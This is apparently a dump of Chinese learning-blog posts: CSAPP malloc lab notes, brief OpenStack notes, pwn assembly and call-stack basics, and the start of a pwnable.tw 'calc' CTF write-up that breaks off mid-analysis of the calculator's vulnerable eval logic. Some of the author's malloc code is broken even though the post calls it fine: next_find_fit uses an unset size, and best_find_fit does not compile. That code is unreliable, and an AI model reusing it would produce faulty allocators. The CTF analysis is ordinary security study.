alt=\"截屏2021-12-04 下午7.21.02\"></a>    </p>\n<p>这里csapp没有为我们提供<code>find_fit()</code>以及<code>place()</code>的例子,需要我们自己编写。我们先放着，之后再来讨论。</p>\n</li>\n</ol>\n<h4 id=\"mm-free\">mm_free()<a class=\"post-anchor\" href=\"#mm-free\"></a></h4><p>​        <code>mm_malloc()</code>之后，我们来看<code>mm_free()</code></p>\n<p>​        它被用来释放已被分配的chunk，相当于释放malloc所请求的bp，然后需要将被释放的chunk与其物理领接的free chunk合并。</p>\n<p>​        </p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.40.53.png\" data-caption=\"截屏2021-12-04 下午5.40.53\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%885.40.53.png\" alt=\"截屏2021-12-04 下午5.40.53\"></a></p>\n<h4 id=\"coalesce\">coalesce()<a class=\"post-anchor\" href=\"#coalesce\"></a></h4><p>​        重点来看<code>coalesce()</code></p>\n<p>​        这里用到的合并方式的构思图表如下：</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.35.04.png\" data-caption=\"截屏2021-12-03 下午5.35.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8B%E5%8D%885.35.04.png\" alt=\"截屏2021-12-03 下午5.35.04\"></a></p>\n<p>​        也是非常地直观容易理解。</p>\n<p>​        它的代码实现也直观地被分为如图四种情况，所以我们先要定义对应图中几种状态的bp状态。</p>\n<pre><code class=\"c\">        size_t prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));\n    size_t next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));\n    size_t size = GET_SIZE(HDRP(bp));\n</code></pre>\n<p>​        大致框架如下：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%886.00.07.png\" data-caption=\"截屏2021-12-04 下午6.00.07\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-04%20%E4%B8%8B%E5%8D%886.00.07.png\" alt=\"截屏2021-12-04 下午6.00.07\"></a></p>\n<p>​        </p>\n<h4 id=\"find-fit\">find_fit()<a class=\"post-anchor\" href=\"#find-fit\"></a></h4><p>​        整个malloc lab的重点，需要自己实现一个free chunk的适配寻找。</p>\n<p>​        一些常见的方法有</p>\n<ol>\n<li>首次适配</li>\n<li>下一次适配</li>\n<li>最佳适配</li>\n<li>分离式（复杂）</li>\n</ol>\n<p>​        其实这些并不是完全先进或者落后，各有各的优缺点。在这里为了简单我们选择首次适配，即使用在free list中找到的第一个符合条件的chunk。</p>\n<p>​        按照首次适配的原理，我们的思路是，从头到尾搜索链表，如果遇到合适的free chunk，则按照size将其头和尾部标记。</p>\n<p>​        实现大致是：</p>\n<p>​        指定一个size，在链表中通过判断头部inuse位，找到第一个free chunk的bp,，然后计算next bp是否大于bp + size</p>\n<p>,且状态为free，如果是，将bp标记为allocated，在bp+size的地方标记为footer，分割该chunk，虽然会留下一定的碎片，但这也是首次适配无法避免的缺点。如果不是，则继续寻找下一个free chunk并判断。</p>\n<p>​        然后来研究代码实现：</p>\n<p>​        自己瞎写了一个，问题不大。</p>\n<h4 id=\"place\">place()<a class=\"post-anchor\" href=\"#place\"></a></h4><p>​        函数功能是将请求块放置在空闲块的起始位置，只有当剩余部分的大小等于或者超出最小块的大小时，才进行分割。</p>\n<pre><code class=\"c\">\n\nstatic void place(void *bp, size_t asize)\n{\n    size_t size = GET_SIZE(HDRP(bp));\n    \n    if ((size - asize) &gt;= (2*DSIZE)) {\n        PUT(HDRP(bp),PACK(asize,1));\n        PUT(FTRP(bp),PACK(asize,1));\n        PUT(HDRP(NEXT_BLKP(bp)),PACK(size - asize,0));\n        PUT(FTRP(NEXT_BLKP(bp)),PACK(size - asize,0));\n    } else {\n        PUT(HDRP(bp),PACK(size,1));\n        PUT(FTRP(bp),PACK(size,1));\n    }\n}\n</code></pre>\n<p>问题不大</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8A%E5%8D%8811.46.52.png\" data-caption=\"截屏2021-12-05 上午11.46.52\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8A%E5%8D%8811.46.52.png\" alt=\"截屏2021-12-05 上午11.46.52\"></a></p>\n<h3 id=\"next-fit\">next_fit<a class=\"post-anchor\" href=\"#next-fit\"></a></h3><p>​        下一次适配，主要特点是在第一次在空闲链表中找到合适的chunk以后，下一次搜索就不再是从头到尾，而是从上一次搜索的chunk开始继续搜索。</p>\n<p>​        相比于首次适配，写循环时就不能嗯搞，要处理第一次找到fit chunk后的状态。大致的思路是：先按照首次适配的方式找到第一个适合的chunk，然后记录下chunk的bp，下一次寻找时则从记录的bp开始寻找。</p>\n<p>​            那么肯定需要定义一个外部变量来记录每次找到的bp。</p>\n<pre><code class=\"c\">static void *next_find_fit(size_t asize)\n{  \n    char * bp = heap_listp;\n    size_t ALLOC_STATUS;\n    size_t SIZE;\n    while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0)\n    {   if(mark_bp)\n        {\n            bp = NEXT_BLKP(mark_bp);\n            ALLOC_STATUS = GET_ALLOC(HDRP(bp));\n            if (ALLOC_STATUS)\n            continue;\n            if(SIZE &lt; asize) \n            continue;\n            mark_bp = bp;\n            return bp; \n            continue;\n        }\n        bp = NEXT_BLKP(bp); \n        ALLOC_STATUS = GET_ALLOC(HDRP(bp));\n        if (ALLOC_STATUS)\n        continue;\n        if(SIZE &lt; asize) \n        continue;\n        mark_bp = bp;\n        return bp; \n    }\n    return NULL;\n}\n</code></pre>\n<p>​        问题不大。</p>\n<h4 id=\"best-fit\">best_fit<a class=\"post-anchor\" href=\"#best-fit\"></a></h4><p>​        搜索链表中的每一个堆块，选择符合条件的最小空闲块。目前来说思路是这样的：</p>\n<p>​        对整个堆空间进行搜索，标记合适的chunk，并将size储存在数组中，在搜索结束后进行排序，选择最适合的chunk，并将bp返回。</p>\n<p>​        对堆空间进行搜索，大概只需要在原本的算法上去掉结束循环的判定条件。然后排序的话随意找个排序算法来就行，图方便我复制了一个冒泡排序，虽然时间复杂度不太行。</p>\n<p>​        但是存在一个问题就是，排序肯定是以chunk的size为标准，但是如何关联size和bp呢？我将所有符合条件的chunksize排序之后，如何找到对应的bp？</p>\n<p>​        一个比较直观的解决方法就是二维数组，将bp和size同时存放，同时排序，当然也许可以使用类似PACK的宏，或者为每一个size增加一个idx，也是二维数组的思路，但是并不是直接将bp存放，而是存放bp的idx。</p>\n<p>​        考虑到二维数组排序有一些麻烦，故直接定义结构体来存放size与bp的idx。</p>\n<pre><code class=\"c\">static void *best_find_fit(size_t asize)\n{   \n    char * bp = heap_listp;\n    size_t ALLOC_STATUS;\n    size_t SIZE;\n    struct bp_list list[];\n    \n    while (GET_SIZE(HDRP(NEXT_BLKP(bp))) &gt; 0)\n    {\n        for ( int i = 0; i &lt; CHUNKSIZE/WSIZE; i++)\n        {   \n            bp = NEXT_BLKP(bp);\n            ALLOC_STATUS = GET_ALLOC(HDRP(bp));\n            if (ALLOC_STATUS) continue;\n            if(SIZE &lt; asize) continue\n            list[i].bp_size = GET_SIZE(HDRP(bp));\n            list[i].bp_idx = i;\n            list[i].bp = HDRP(bp);\n            \n        } \n\n        bubble_sort(int list[i].bp_size,int i);\n        return list[i].bp;\n            \n\n    }\n    return NULL;\n}\n</code></pre>\n<h2 id=\"4-level2\">4) level2<a class=\"post-anchor\" href=\"#4-level2\"></a></h2><p>​        level2利用显式链表和分离适配来实现，同时这种方法也是非常接近ptmalloc2的，所以学习这种方法的思想是十分必要的。</p>\n<h3 id=\"数据结构\">数据结构<a class=\"post-anchor\" href=\"#数据结构\"></a></h3><h4 id=\"显式空闲链表\">显式空闲链表<a class=\"post-anchor\" href=\"#显式空闲链表\"></a></h4><p>​        相比于隐式空闲链表没有实际的链表去管理空闲块，显式空闲链表使用新增的双向循环链表，通过在chunk头添加指向逻辑上相邻的chunk的指针来相互连接。显式链表为chunk指针操作增添了更多姿势，突破了隐式性能的局限性。当然这个方案也不是完全没有缺点，为了包含指针和可能的脚部，显式空闲链表的chunk通常会更大一些，潜在地提高了内存碎片的程序。</p>\n<h4 id=\"chunk\">chunk<a class=\"post-anchor\" href=\"#chunk\"></a></h4><p>​        显式链表chunk结构如图：</p>\n<p><a href=\"https://pic1.zhimg.com/80/v2-c0cb0926ad2e469833bfff9e3fffd2e4_720w.jpg\" data-caption=\"img\" data-fancybox=\"images\"><img src=\"https://pic1.zhimg.com/80/v2-c0cb0926ad2e469833bfff9e3fffd2e4_720w.jpg\" alt=\"img\"></a></p>\n<p>​        有点类似ptalloc的机制，当chunk为allocated状态，中间为padding，当为free状态，会在padding开始前，也就是之前方案中的<code>bp</code>指向的地方增添两个指针：<code>next_bp</code>， <code>prev_bp</code>。</p>\n<h3 id=\"First-fit\">First_fit<a class=\"post-anchor\" href=\"#First-fit\"></a></h3><p>​        因为确实不太会写，所以基本算是照着代码分析思路了。</p>\n<p>​        首先是完成显式空闲链表下first_fit的实现，这种方案目的是熟悉如何通过创建一个双向循环链表来管理空闲块。</p>\n<p>​        第一步是创建空闲链表。</p>\n<p>​        </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8B%E5%8D%884.46.18.png\" data-caption=\"截屏2021-12-09 下午4.46.18\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-09%20%E4%B8%8B%E5%8D%884.46.18.png\" alt=\"截屏2021-12-09 下午4.46.18\"></a></p>\n<p>​        显式链表下的<code>free()</code>也和隐式空闲链表没区别，都是把chunk 头的size置0，但是多出来了</p>\n<pre><code class=\"c\">    SET_PREV(bp, 0);\n    SET_NEXT(bp, 0);\n</code></pre>\n<p>​        也就是先将需要free的chunk的fd和bk位全部设置为0，然后进行合并后放入空闲链表。</p>\n<p>​    </p>\n<p>​    </p>\n<p>然后编写将chunk插入和取出双向循环链表的操作。</p>\n<h4 id=\"insert-from-free-list\">insert_from_free_list()<a class=\"post-anchor\" href=\"#insert-from-free-list\"></a></h4><p>​    将已分配块释放，chunk bp 被插入free list。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.31.31.png\" data-caption=\"截屏2021-12-05 下午11.31.31\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.31.31.png\" alt=\"截屏2021-12-05 下午11.31.31\"></a>        </p>\n<h4 id=\"remove-from-free-list\">remove_from_free_list()<a class=\"post-anchor\" href=\"#remove-from-free-list\"></a></h4><p>​        在free list中拿出chunk。与隐式链表类似，分为四种情况。因为是双向循环链表，所以解链的过程也可以理解为unlink。</p>\n<p>​        第一种情况：<code>prev == NULL &amp;&amp; next == NULL</code>，chunk前后都是allocated chunk，双向链表中啥也没有，设置表头为空。</p>\n<p>​        第二种情况：<code>prev == NULL</code>    ，前一个chunk为allocated，前一项为空，说明此时chunk的前面没有chunk，那么bk本身就是空的，解链就需要设置fd为空，也就是next为0。</p>\n<p>​        第三种情况同理。</p>\n<p>​        第四种情况：chunk前后都有free chunk，那么解链相当于一个标准的unlink，就是将前一个chunk的bp的next位设置为下一个chunk的bp，然后下一个chunk的prev位设置为前一个chunk的bp。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.47.40.png\" data-caption=\"截屏2021-12-05 下午11.47.40\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.47.40.png\" alt=\"截屏2021-12-05 下午11.47.40\"></a></p>\n<h3 id=\"分离适配\">分离适配<a class=\"post-anchor\" href=\"#分离适配\"></a></h3><p>​        分离适配的特点就是利用很多储存不同大小范围的chunk的链表来管理free chunk，很大程度上减小了内存碎片的产生。</p>\n<p>​        根据参考资料，我们可以将大小以2^n划分。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.48.png\" data-caption=\"截屏2021-12-05 下午11.52.48\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.48.png\" alt=\"截屏2021-12-05 下午11.52.48\"></a></p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.59.png\" data-caption=\"截屏2021-12-05 下午11.52.59\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-05%20%E4%B8%8B%E5%8D%8811.52.59.png\" alt=\"截屏2021-12-05 下午11.52.59\"></a></p>\n<p>​                    </p>\n<h2 id=\"5）结果与改进\">5）结果与改进<a class=\"post-anchor\" href=\"#5）结果与改进\"></a></h2><p>​        </p>\n<p>​        </p>\n<h2 id=\"6）反思与思考\">6）反思与思考<a class=\"post-anchor\" href=\"#6）反思与思考\"></a></h2><p>​        本来应该是在今年暑假就要完成的东西，因为太过懒散而拖到了现在。不得不说如果沉下心来做，这个lab其实不算很难，最难的实际上是对这个简单的内存分配器从0到逐渐熟悉架构的过程。如果不去认真读csapp，了解程序的大致架构的话，就会一头雾水从而放弃，暑假便是因此。</p>\n<p>​        其实大多数代码并不需要自己完成，也是确实没有这个水平，但是也有我们自己需要思考，然后实现的地方，就比如说适配的方法。我从来没有学过数据结构或者算法，也没有刷过类似的题，c语言也就是局限于看得懂这样的普通计算机专业学生水平，对于这种大面积的指针操作一时确实有些摸不着头脑，但是csapp给了我们一种解：利用宏，将复杂的指针运算以及强制类型转换封装，变得简单易用，这使得在我操作指针时，几乎感受不到指针的复杂所在，也是我觉得收获最大之所在。</p>\n<p>​        关于三种适配方法，第一种我在编写时并不太理解如何实现“继续寻找下一个chunk”，于是自己按照感觉写了一个版本，然后寻找了一些参考，发现我写的除了这一步，其他都问题不大，然后就把自己的版本修正了。之后的两种适配方法都是基于首次适配的代码加以适当的条件修改而成，不得不说其实十分有趣。最佳适配牵涉到数组的排序以及结构体的定义，说实话上一次编写带结构体的c程序还是上学期起哦期末的暑假考核，但是也没有遇到什么障碍，就这么顺着写了。现在想来我们大一上的c语言大作业真是简单捏。</p>\n<p>​        </p>\n<h2 id=\"7）参考\">7）参考<a class=\"post-anchor\" href=\"#7）参考\"></a></h2><p>​        <a href=\"https://www.jianshu.com/p/48d5d0554b3b\">六 Malloc Lab</a></p>\n<p>​    <a href=\"https://zhuanlan.zhihu.com/p/150100073\">CSAPP:Lab5-Malloc Lab</a></p>\n</body></html>","tags":["csapp lab"]},{"title":"openstack学习笔记","url":"/2021/11/22/openstack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<html><head></head><body><p>​        为了跟上网校的集群重构计划，这下狠狠地开始学习运维了。</p>\n<p>​        在开始具体的openstack学习之前，首先需要学习一下一些基本的运维概念。</p>\n<h3 id=\"虚拟化-容器化\">虚拟化/容器化<a class=\"post-anchor\" href=\"#虚拟化-容器化\"></a></h3><p>​        之前在学习docker的时候对于容器化已经有一个比较到位的认知了，而与容器化相对应的虚拟化并没有深入理解。</p>\n<p>​        这里的虚拟化特指服务器虚拟化。就是在一台服务器上运行虚拟运行多个服务器。</p>\n<h3 id=\"虚拟化分类\">虚拟化分类<a class=\"post-anchor\" href=\"#虚拟化分类\"></a></h3><h4 id=\"完全虚拟化\">完全虚拟化<a class=\"post-anchor\" href=\"#完全虚拟化\"></a></h4><p>​        利用Hypervisor，将硬件与软件完全隔离，性能较差。</p>\n<h4 id=\"准虚拟化\">准虚拟化<a class=\"post-anchor\" href=\"#准虚拟化\"></a></h4><p>​        改动操作系统，使操作系统以为自己是独立的。</p>\n<h4 id=\"操作系统层虚拟化\">操作系统层虚拟化<a class=\"post-anchor\" href=\"#操作系统层虚拟化\"></a></h4><p>​        改动操作系统，使主机成为虚拟机管理软件。</p>\n<h4 id=\"桌面虚拟\">桌面虚拟<a class=\"post-anchor\" href=\"#桌面虚拟\"></a></h4><p>​        不讨论</p>\n<h4 id=\"硬件虚拟\">硬件虚拟<a class=\"post-anchor\" href=\"#硬件虚拟\"></a></h4><p>​        虚拟硬件而不是虚拟操作系统。</p>\n<h3 id=\"虚拟化技术分类\">虚拟化技术分类<a class=\"post-anchor\" href=\"#虚拟化技术分类\"></a></h3><p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n</body></html>","tags":["SRE"]},{"title":"pwn基础","url":"/2021/10/13/pwn%E5%9F%BA%E7%A1%80/","content":"<html><head></head><body><p>[TOC]</p>\n<h2 id=\"汇编语言\">汇编语言<a class=\"post-anchor\" href=\"#汇编语言\"></a></h2><h3 id=\"1）寻址\">1）寻址<a class=\"post-anchor\" href=\"#1）寻址\"></a></h3><h5 id=\"1-直接寻址\">1/直接寻址<a class=\"post-anchor\" href=\"#1-直接寻址\"></a></h5><pre><code class=\"asm\">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。\n</code></pre>\n<h5 id=\"2-间接寻址\">2/间接寻址<a class=\"post-anchor\" href=\"#2-间接寻址\"></a></h5><p>间接在使用指针以及解引用的形式</p>\n<pre><code class=\"asm\">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。\n</code></pre>\n<h5 id=\"3-比例寻址\">3/比例寻址<a class=\"post-anchor\" href=\"#3-比例寻址\"></a></h5><p>例如在数组遍历中</p>\n<pre><code class=\"asm\">.data\narrayD 1,2,3,4\n.code\nmov esi,3\nmov eax,arrayD[esi*4]                    ;eax = 4\n</code></pre>\n<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>\n<h2 id=\"2）段寄存器\">2）段寄存器<a class=\"post-anchor\" href=\"#2）段寄存器\"></a></h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>\n<h2 id=\"3）基础指令\">3）基础指令<a class=\"post-anchor\" href=\"#3）基础指令\"></a></h2><h3 id=\"1-数据传输\">1/数据传输<a class=\"post-anchor\" href=\"#1-数据传输\"></a></h3><h4 id=\"mov\">mov<a class=\"post-anchor\" href=\"#mov\"></a></h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>\n<h5 id=\"movzx\">movzx<a class=\"post-anchor\" href=\"#movzx\"></a></h5><p>对目的操作数进行全0拓展并且复制。</p>\n<h5 id=\"movsx\">movsx<a class=\"post-anchor\" href=\"#movsx\"></a></h5><p>同上，但是是用1拓展而不是0。</p>\n<p>与数据传输相关的指令还有很多，以后待补充。</p>\n<h3 id=\"2-与数据相关的运算符和伪指令\">2/与数据相关的运算符和伪指令<a class=\"post-anchor\" href=\"#2-与数据相关的运算符和伪指令\"></a></h3><h4 id=\"offset\">offset<a class=\"post-anchor\" href=\"#offset\"></a></h4><p>返回一个偏移量</p>\n<h4 id=\"align\">align<a class=\"post-anchor\" href=\"#align\"></a></h4><p>将一个变量对齐到边界。</p>\n<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>\n<h4 id=\"ptr\">ptr<a class=\"post-anchor\" href=\"#ptr\"></a></h4><p>重写一个已经被声明过操作数的大小类型。</p>\n<h4 id=\"type\">type<a class=\"post-anchor\" href=\"#type\"></a></h4><p>返回变量单个元素的大小</p>\n<h4 id=\"lengthof\">lengthof<a class=\"post-anchor\" href=\"#lengthof\"></a></h4><p>计算数组中元素的个数</p>\n<h4 id=\"sizeof\">sizeof<a class=\"post-anchor\" href=\"#sizeof\"></a></h4><p>返回lengthof和type的乘积</p>\n<h2 id=\"函数调用栈\">函数调用栈<a class=\"post-anchor\" href=\"#函数调用栈\"></a></h2><p>从一个简单的程序入手。</p>\n<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png\" data-caption=\"image-20211012194601557\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png\" alt=\"image-20211012194601557\"></a></p>\n<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>\n<pre><code class=\"asm\">push    rbp\nmov     rbp, rsp\nsub     rsp, 30h\n</code></pre>\n<p>然后就是人神共愤的函数调用栈环节。</p>\n<blockquote>\n<p>rbp ： 栈基址指针寄存器 。</p>\n<p>rsp ： 栈顶指针寄存器。</p>\n</blockquote>\n<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>\n<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>\n<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png\" data-caption=\"截屏2021-10-12 下午11.11.18\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png\" alt=\"截屏2021-10-12 下午11.11.18\"></a></p>\n<p>​     ebp也就是s的位置，很显然在esp之下。</p>\n<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>\n<blockquote>\n<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>\n</blockquote>\n<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png\" data-caption=\"截屏2021-10-13 下午8.01.32\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png\" alt=\"截屏2021-10-13 下午8.01.32\"></a></p>\n<blockquote>\n<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>\n</blockquote>\n<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>\n<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>\n<p>​    关于压栈的一些传参方式，可以参见<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/\">格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</a>，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png\" data-caption=\"截屏2021-10-13 下午5.14.08\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png\" alt=\"截屏2021-10-13 下午5.14.08\"></a></p>\n<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>\n<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>\n<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>\n<p>tbc</p>\n</body></html>","tags":["pwn Primary"]},{"title":"pwnable-calc","url":"/2021/11/18/pwnable-calc/","content":"<html><head></head><body><h3 id=\"逆向\">逆向<a class=\"post-anchor\" href=\"#逆向\"></a></h3><p>​        程序实现了一个简单的计算器功能。运算有加减乘除四种。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-18%20%E4%B8%8A%E5%8D%8810.33.21.png\" data-caption=\"截屏2021-11-18 上午10.33.21\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-18%20%E4%B8%8A%E5%8D%8810.33.21.png\" alt=\"截屏2021-11-18 上午10.33.21\"></a></p>\n<p>​        并且程序再次自带计时功能，需要patch。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-20%20%E4%B8%8A%E5%8D%889.57.37.png\" data-caption=\"截屏2021-11-20 上午9.57.37\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-20%20%E4%B8%8A%E5%8D%889.57.37.png\" alt=\"截屏2021-11-20 上午9.57.37\"></a></p>\n<p>​        静态链接，所以肯定不能用ret2libc那一套，只能试图ROP一下。</p>\n<p>​        程序主要功能通过<code>get_expr</code>和<code>calculate</code>（原本不叫这个）两个函数实现。</p>\n<p>​        <code>get_expr</code>主要用于定位我们输入的字符串中运算符的位置。修改过的ida伪代码如下:</p>\n<pre><code class=\"c\">int __cdecl get_expr(int input_str, int _1024)\n{\n  int idx_0; // eax\n  char operator; // [esp+1Bh] [ebp-Dh]\n  int i; // [esp+1Ch] [ebp-Ch]\n\n  i = 0;\n  while ( i &lt; _1024 &amp;&amp; read(0, &amp;operator, 1) != -1 &amp;&amp; operator != '\\n' ) //栈溢出\n  {\n    if ( operator == '+'\n      || operator == '-'\n      || operator == '*'\n      || operator == '/'\n      || operator == '%'\n      || operator &gt; '/' &amp;&amp; operator &lt;= '9' )\n    {\n      idx_0 = i++;\n      *(_BYTE *)(input_str + idx_0) = operator; // 通过循坏找到运算符的位置\n                                                 \n    }\n  }\n  *(_BYTE *)(i + input_str) = 0;\n  return i;\n</code></pre>\n<p>​        在这之后还有一个<code>init_pool</code>函数。函数参数为表达式数组的索引。大致就是初始化一个大小的100的字符串数组。</p>\n<p>​        <code>calculate</code>函数则负责进行运算。    </p>\n<p>​        实在是没有思路，于是找到了wp。不得不说pwnable.tw上面的题目每个都出得很好，几乎没有板子题，而且漏洞点都丝毫不传统。</p>\n<p>​        主要的问题还是在这个运算的逻辑上</p>\n<pre><code class=\"c\">DWORD *__cdecl eval(_DWORD *num, char operator)\n{\n  _DWORD *result; // eax\n\n  if ( operator == '+' )\n  {\n    num[*num - 1] += num[*num];\n  }\n  else if ( operator &gt; '+' )\n  {\n    if ( operator == '-' )\n    {\n      num[*num - 1] -= num[*num];\n    }\n    else if ( operator == '/' )\n    {\n      num[*num - 1] /= num[*num];\n    }\n  }\n  else if ( operator == '*' )\n  {\n    num[*num - 1] *= num[*num];\n  }\n  result = num;\n  --*num;\n  return result;\n}\n</code></pre>\n<p>​        这里<code>*num</code>，也就是<code>num[0]</code>的值，是检测到的表达式中数字的数量。</p>\n<p>​        